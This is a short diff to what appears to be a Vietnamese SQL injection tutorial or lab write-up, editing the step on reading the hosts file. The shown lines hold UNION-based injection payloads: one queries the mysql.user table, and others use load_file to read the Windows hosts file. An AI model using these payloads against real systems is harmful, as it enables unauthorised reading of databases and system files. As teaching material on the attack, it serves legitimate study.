@@ -69,7 +69,6 @@ Mục lục:
 ![Hinh 14.](~/../img/14.png)
 
 3. File hosts
-`' UNION SELECT (SELECT group_concat(HOST) FROM mysql.user),NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14  #`
+`' UNION SELECT load_file("C:/Windows/System32/Drivers/etc/hosts"),NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #`
 ![Hinh 15.](~/../img/15.png)
 
-`' UNION SELECT load_file("Windows\System32\Drivers\etc\hosts"),NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #`
